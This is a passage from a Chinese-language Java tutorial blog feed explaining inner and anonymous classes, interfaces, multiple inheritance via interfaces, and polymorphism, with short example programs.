punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token punctuation">}</span>/*在方法dest（）中定义了一个内部类，最后由这个方法返回这个内部类的对象。如果在用一个内部类的时候仅需要创建它的一个对象并传给外部，就可以这样做。*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>方法中定义内部类的注意点:</strong></font><br> (1) 方法中定义的类，在其它地方使用时，没有类的名字，一般用其父类来引用这样的变量。<br> (2) 同局部变量一样，方法中的内部类前面不能用public，private，protected修饰，也不能用static修饰，但可以被final或abstract修饰。<br> (3) 方法中的内部类，可以访问其外部类的成员;若是static方法中的内部类，可以访问外部类的static成员。<br> (4) 方法中的内部类中，不能访问该方法的局部变量，除非是final的局部变量。<br></font></p><p>&emsp;</p><pre class="line-numbers language-bash"><code class="language-bash">例2: 作用域中的内部类:public class Goods3<span class="token punctuation">{</span>     private void internalTracking<span class="token punctuation">(</span>boolean b<span class="token punctuation">)</span> <span class="token punctuation">{</span>          if<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token punctuation">{</span>               class TrackingSlip <span class="token punctuation">{</span>                    private String <span class="token function">id</span><span class="token punctuation">;</span>                    TrackingSlip<span class="token punctuation">(</span>String s<span class="token punctuation">)</span> <span class="token punctuation">{</span>                         <span class="token function">id</span> <span class="token operator">=</span> s<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    String getSlip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token function">id</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>               <span class="token punctuation">}</span>              TrackingSlip ts <span class="token operator">=</span> new TrackingSlip<span class="token punctuation">(</span><span class="token string">"slip"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               String s <span class="token operator">=</span> ts.getSlip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span> public void track<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> internalTracking<span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>     public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>          Goods3 g<span class="token operator">=</span> new Goods3<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          g.track<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="2-3-匿名内部类"><font color="#20B2AA" face="Comic sans MS">2.3  匿名内部类 </font><a href="post/Java-Variable-InnerClass6#2-3-匿名内部类"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>匿名类：</strong></font> 类或方法中定义的一种没有类名的特殊内部类。<br><font color="red"><strong>作用：</strong></font>当需要创建一个类的对象而且用不上它的名字时，使用内部类可以使代码看上去简洁清楚。<br><font color="red"><strong>语法规则如下：</strong></font><br>       new interfacename(){……};<br>      或new superclassname(){……};</font></p><p><font color="red"><strong>注意：</strong></font><br> (1) 这种类不取名字，而直接用其父类的名字或者它所实现的接口的名字；<br> (2) 类的定义与创建该类的一个对象同时进行，即类的定义前面有一个new，没有类的首部，对象的创建和类体共同构成一个匿名类表达式，后面以“;”结束；<br> (3) 类中不能定义构造方法，因为它没有名字。<br></p><pre class="line-numbers language-bash"><code class="language-bash">interface Contents<span class="token punctuation">{</span>  int value<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>public class Goods4 <span class="token punctuation">{</span>     public Contents cont<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          //返回匿名类对象，该匿名类继承了Contents接口          <span class="token keyword">return</span> new Contents<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               private int i <span class="token operator">=</span> 11<span class="token punctuation">;</span>               public int value<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                     <span class="token keyword">return</span> i<span class="token punctuation">;</span>                <span class="token punctuation">}</span>          <span class="token punctuation">}</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>     <span class="token punctuation">{</span>      Goods4 g<span class="token operator">=</span>new Goods4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      Contents c<span class="token operator">=</span>g.cont<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><hr><p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java接口、包(4.7-4.8)</title>
      <link href="/post/Java-Interface-Package5/"/>
      <url>/post/Java-Interface-Package5/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br>&emsp;</p><center><font color="#3CB371" face="Comic sans MS" size="5">接口 & 包</font></center><p>&emsp;</p><h3 id="一、-接口"><font color="#FF6347" face="Comic sans MS">一、 接口</font><a href="post/Java-Interface-Package5#一、-接口"></a></h3><h4 id="1-1-接口的概念"><font color="#20B2AA" face="Comic sans MS">1.1  接口的概念</font><a href="post/Java-Interface-Package5#1-1-接口的概念"></a></h4><p><font face="Comic sans MS"><strong>1.  📒使程序设计和实现相互分离：</strong><br>在单继承的继承树中，设计和实现不可避免地要纠缠在一起。在设计的时候，人们也许只想提供一个类的抽象的接口，而不希望去具体实现它，因为那是实现阶段的事情。使用接口类型可以很完美地解决这个问题。</font></p><p><strong>2.📒弥补Java只支持单重继承的不足：</strong><br>   Java的类型层次结构具有一定的局限——它只支持单继承，一个类只能有一个父类，而不能交叉继承树的其它分支中有用的部分。这样就给面向对象的程序设计带来了一些困难。但是多继承的引入使得继承层次结构变得混乱，更加容易出错和产生二义性。</p><p><strong>3.📒约束实现接口的类</strong>:<br>接口只是约束实现了该接口的类必须满足接口的要求。<br>当定义一个接口时，实际上是在编写一个契约，用来描述实现其的类能够做什么，能够充当什么角色，具体怎么做和接口无关。</p><p><strong>所以，Java抛弃了多继承，引入一种新的层次结构——<font color="red">接口</font>来达到同样的功能。</strong></p><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">📒**接口和类的区别：** </font>  (1) 类只能单继承，而接口可以多继承。 (2) 类中的方法可以是具体的，也可以抽象的。 接口中的方法都是抽象的。 (3) 接口中的方法要用类来实现，一个类可以实现多个接口。<font color="red">📒**注意：**  </font>  (1) 接口可以继承：一个接口可以继承多个其它的接口， (2) 接口中的方法要用类来实现 。 (3) 一个类可以实现多个接口 。 (4) Java接口反映了对象较高层次的抽象，为描述相互似乎没有关系的对象的共性提供了一种有效的手段。</font></td></tr></table></div></div><p>&emsp;<br>&emsp;</p><h4 id="1-2-接口的说明"><font color="#20B2AA" face="Comic sans MS">1.2  接口的说明</font><a href="post/Java-Interface-Package5#1-2-接口的说明"></a></h4><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">[</span>修饰符<span class="token punctuation">]</span> <span class="token keyword">interface</span> 接口名<span class="token punctuation">[</span><span class="token keyword">extends</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>接口列表<span class="token punctuation">]</span><span class="token punctuation">{</span>   接口体<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1.  📒首部：</strong></font><br><strong>修饰符：</strong>或者不使用修饰符（同包访问），或者只能使用public（任意访问）。归结为只能使用public或者缺省.<br><strong>extends：</strong>定义父接口，支持多重继承(多个父接口用逗号分隔)<br>&emsp;&emsp;&emsp;&emsp;public interface Cookable extends Foodable,Printable</font></p><p><font color="#00B2EE"><strong>2.📒接口体：定义常量和抽象方法：</strong></font><br>&emsp;<font color="red"><strong>接口的成员：成员变量和方法</strong></font><br><strong>(1) 接口中的成员变量：</strong>都是隐含public、static、final的——静态最终变量（常量），例如在接口中有下面这行代码：<br>int STEP=5;<br>等同于：<br>public static final int STEP=5;<br><strong>(2) 接口中的方法：</strong>接口中说明的方法都是抽象方法，所有方法隐含public和abstract的 ，例如 int increment(int x)；<br><font color="red">注意， 接口中的方法不能使用下面的修饰符：</font><br>     static<br>     native或synchronized<br>     final<br></p><p>&emsp;<br>&emsp;</p><h4 id="1-3-接口的使用"><font color="#20B2AA" face="Comic sans MS">1.3  接口的使用</font><a href="post/Java-Interface-Package5#1-3-接口的使用"></a></h4><p><font face="Comic sans MS">&emsp;接口自己不能提供方法的实现，接口中的方法必须由类实现。Java语言用关键字implements声明类中将实现的接口。声明接口的形式：<br>&emsp;&emsp;<font color="#00B2EE">[类修饰符]  class类名  [extends子句]  [ implements 子句]</font><br><font color="red"><strong>注意：</strong></font><br>在implements子句中可以包含多个接口类型，各个接口类型之间用逗号隔开。<br></font></p><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">[</span>例<span class="token number">4</span><span class="token operator">-</span><span class="token number">19</span><span class="token punctuation">]</span>  TestInterface<span class="token punctuation">.</span>java 接口的使用示例<span class="token keyword">interface</span> <span class="token class-name">Runner</span><span class="token punctuation">{</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">Swimmer</span><span class="token punctuation">{</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">swim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span><span class="token keyword">abstract</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token keyword">extends</span> <span class="token class-name">Animal</span> <span class="token keyword">implements</span> <span class="token class-name">Runner</span><span class="token punctuation">,</span>Swimmer <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//Person是能跑和游泳的动物，所以继承了Animal，同时实现了Runner和Swimmer两个接口</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"run"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">swim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"swim"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"eat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestInterface</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        TestInterface t<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TestInterface</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Person p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">m1</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">m2</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">m3</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">m1</span><span class="token punctuation">(</span>Runner f<span class="token punctuation">)</span><span class="token punctuation">{</span>f<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">m2</span><span class="token punctuation">(</span>Swimmer s<span class="token punctuation">)</span><span class="token punctuation">{</span>s<span class="token punctuation">.</span><span class="token function">swim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">m3</span><span class="token punctuation">(</span>Animal a<span class="token punctuation">)</span><span class="token punctuation">{</span>a<span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="1-4-对接口的引用"><font color="#20B2AA" face="Comic sans MS">1.4  对接口的引用</font><a href="post/Java-Interface-Package5#1-4-对接口的引用"></a></h4><p><font face="Comic sans MS">&emsp;(1) 接口可以作为一种引用类型来使用。任何实现该接口的类的实例都可以存储在该接口类型的变量中，通过这些变量可以访问类所实现的接口中的方法。Java运行时系统动态地确定该使用哪个类中的方法。</font></p><p>&emsp;(2) 把接口作为一种数据类型可以不需要了解对象所对应的具体的类，而着重于它的交互界面。例如，[例4-18]中Person类实现了Runner接口，可以如下赋值，和子类对象赋给父类对象是类似的：<br>          Runner r=new Person();<br></p><p>&emsp;<br>&emsp;</p><h4 id="1-5-使用接口实现多重继承"><font color="#20B2AA" face="Comic sans MS">1.5  使用接口实现多重继承</font><a href="post/Java-Interface-Package5#1-5-使用接口实现多重继承"></a></h4><p><font face="Comic sans MS">&emsp;程序设计有时需要表达这样的意思：<br>&emsp;&emsp;<font color="#00B2EE"> “x从属于a，也从属于b，也从属于c” </font><br><strong>C++：</strong>多重继承，每个类都有具体的实施细节<br><strong>Java：</strong>接口，只有一个类有具体的实施细节<br></font></p><div class="article-img"><p><img src="https://i.loli.net/2018/12/27/5c246b3100ab8.png" alt="图片1.png" data-zoomable></p></div><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">[</span>例<span class="token number">4</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">]</span>  Swan<span class="token punctuation">.</span>java 接口实现多重继承<span class="token comment" spellcheck="true">/* Swan表示天鹅类，它继承了animal基础类，并实现了接口canWalk、canSwim、canFly，即天鹅具有animal的功能，同时也具有行走、游泳和飞行的功能。这就实现了多重继承。*/</span><span class="token keyword">interface</span> <span class="token class-name">canWalk</span><span class="token punctuation">{</span>   <span class="token keyword">void</span> <span class="token function">walk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">canSwim</span><span class="token punctuation">{</span> <span class="token keyword">void</span> <span class="token function">swim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">canFly</span><span class="token punctuation">{</span><span class="token keyword">void</span> <span class="token function">fly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">animal</span><span class="token punctuation">{</span><span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Swan</span> <span class="token keyword">extends</span> <span class="token class-name">animial</span> <span class="token keyword">implements</span> <span class="token class-name">canWalk</span><span class="token punctuation">,</span>canSwim<span class="token punctuation">,</span>canFly<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">walk</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span> System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"swan walking!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">swim</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span> System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"swan swimming!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">fly</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span> System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"swan flying!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"swan eating!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        Swan swan<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Swan</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        swan<span class="token punctuation">.</span><span class="token function">walk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        swan<span class="token punctuation">.</span><span class="token function">swim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        swan<span class="token punctuation">.</span><span class="token function">fly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        swan<span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="1-6-抽象类和接口的选择"><font color="#20B2AA" face="Comic sans MS">1.6  抽象类和接口的选择</font><a href="post/Java-Interface-Package5#1-6-抽象类和接口的选择"></a></h4><p><font color="red"><strong><em>问题：接口和抽象类都可以使设计和实现分离，那么继承结构中的基础类应该定义成一个普通类、抽象类还是接口 ？？</em></strong></font><br><font face="Comic sans MS">(1) 在语法上都是可以的，但是把基础类定义成抽象类或接口往往会增加程序的灵活性和容错性；<br>(2) 如果基础类只是定义一些接口，根本不需要具体的实现，<font color="#00B2EE"> <strong>那么首先优先选择使用接口，接口的抽象程度比抽象类更高；</strong></font><strong>如果基础类必须实现方法或者定义成员变量的时候，才考虑采用抽象类。</strong></font></p><p>&emsp;<br>&emsp;</p><h4 id="1-7-多态"><font color="#20B2AA" face="Comic sans MS">1.7  多态</font><a href="post/Java-Interface-Package5#1-7-多态"></a></h4><p><font face="Comic sans MS">📒<strong>多个类中的多态：</strong>在具有继承关系的多个类中，子类对父类方法的覆盖（不能是重载父类的方法），即子类和父类可以有相同首部的方法，运行的时间决定每个对象到底执行哪个特定的版本。<br>📒<strong>判断程序中是否存在多态：</strong><font color="red"><strong>继承(覆盖)、向上转型、动态绑定。</strong></font></font></p><p>&emsp;<font color="red"><strong>1. 覆盖：</strong></font>前面已经讲过，如下：<br><img src="https://i.loli.net/2019/01/08/5c3473153aa24.png" alt="20-1.png"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">[</span>例<span class="token number">4</span><span class="token operator">-</span><span class="token number">21</span><span class="token punctuation">]</span> Shapes<span class="token punctuation">.</span>java 多态性示例<span class="token number">1</span><span class="token keyword">class</span> <span class="token class-name">Shape</span> <span class="token punctuation">{</span>   <span class="token keyword">void</span> <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token keyword">void</span> <span class="token function">erase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Circle</span> <span class="token keyword">extends</span> <span class="token class-name">Shape</span> <span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Circle.draw()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token keyword">void</span> <span class="token function">erase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Circle.erase()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Square</span> <span class="token keyword">extends</span> <span class="token class-name">Shape</span> <span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Square.draw()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">void</span> <span class="token function">erase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Square.erase()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Shapes</span> <span class="token punctuation">{</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">doShape</span><span class="token punctuation">(</span>Shape s<span class="token punctuation">)</span><span class="token punctuation">{</span>  s<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  s<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Circle c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Square s<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Square</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">doShape</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">doShape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>运行结果：Circle<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Circle<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Square<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Square<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;<font color="red"><strong>2. 向上转型：</strong></font>子类对象可以直接转换成父类对象，即一个对象除了可以当作自己的类型，还可以作为它的基础类型对待，这种把子类型当作它的基本类型处理的过程，就叫作向上转型（即“Upcasting”）<br><strong>例如：</strong><br>Shape s=new Circle();<br>Circle c=new Circle();<br>Square s=new Square();<br>doShape(c);<br>doShape(s);</p><p>&emsp;<font color="red"><strong>3. 动态绑定：</strong></font><br>&emsp;&emsp;绑定：将一个方法调用同一个方法体连接起来<br>&emsp;&emsp;早期绑定：程序运行以前执行绑定；<br>&emsp;&emsp;动态绑定（或后期绑定）：在运行期间执行绑定。<br><font color="#00B2EE"><strong>Java支持动态绑定：能在运行期间判断参数的实际类型，并分别调用适当的方法体，从而实现了多态性。在Java中所有非final和非static的方法都会自动地进行动态绑定。</strong></font><br></p><p><em>如下代码块：</em><br><img src="https://i.loli.net/2018/12/27/5c24716ea85b2.png" alt="21"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Shape</span> <span class="token punctuation">{</span>   <span class="token keyword">void</span> <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token keyword">void</span> <span class="token function">erase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Triangle</span> <span class="token keyword">extends</span> <span class="token class-name">Shape</span> <span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Triangle.draw()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token keyword">void</span> <span class="token function">erase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Triangle.erase()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Shapes</span> <span class="token punctuation">{</span>  <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">doShape</span><span class="token punctuation">(</span>Shape s<span class="token punctuation">)</span> <span class="token punctuation">{</span>     s<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     s<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>   <span class="token punctuation">{</span>    Circle c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token 